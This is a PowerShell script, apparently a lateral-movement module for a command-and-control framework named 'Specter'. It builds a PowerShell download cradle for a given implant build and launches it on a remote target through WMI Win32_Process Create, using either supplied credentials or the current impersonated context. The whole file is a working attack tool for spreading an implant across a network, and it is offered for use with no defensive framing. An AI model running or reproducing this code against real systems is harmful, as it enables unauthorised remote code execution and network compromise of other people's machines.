param(
    [Parameter(ParameterSetName="Impersonate", Mandatory=$True, HelpMessage="The IP address or hostname of the system to run the cradle.")]
    [Parameter(ParameterSetName="Username and Password", Mandatory=$True, HelpMessage="The IP address or hostname of the system to run the cradle.")]
    [ValidateNotNullOrEmpty]
    [string]$Target,

    [Parameter(ParameterSetName="Username and Password", Mandatory=$True, HelpMessage="The local or domain username to authenticate with.")]
    [ValidateNotNullOrEmpty]
    [string]$Username,

    [Parameter(ParameterSetName="Username and Password", Mandatory=$True, HelpMessage="The password for the specified user.")]
    [ValidateNotNullOrEmpty]
    [string]$Password,

    [Parameter(ParameterSetName="Impersonate", Mandatory = $true, HelpMessage = "The Specter build identifier.")]
    [Parameter(ParameterSetName="Username and Password", Mandatory = $true, HelpMessage = "The Specter build identifier.")]
    [ValidateNotNullOrEmpty()]
    [Build]
    [string]$Build
)

#Generate a new PowerShell cradle command
$Command = payload -Build $Build -Kind 'ps_command';

#Execute command on remote system using WMI commandline executable
if(![String]::IsNullOrEmpty($Username) -and $Password -ne $null) {
    #Run with explicit credentials
    $SecurePassword = ConvertTo-SecureString -String $Password -AsPlainText -Force
    $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $Username, $SecurePassword

    Invoke-WmiMethod -Class "WIN32_PROCESS" -Name "Create" -ArgumentList $Command -ComputerName $Target -Credential $Credential
} else {
    #Run with impersonation
    Invoke-WmiMethod -Class "WIN32_PROCESS" -Name "Create" -ArgumentList $Command -ComputerName $Target
}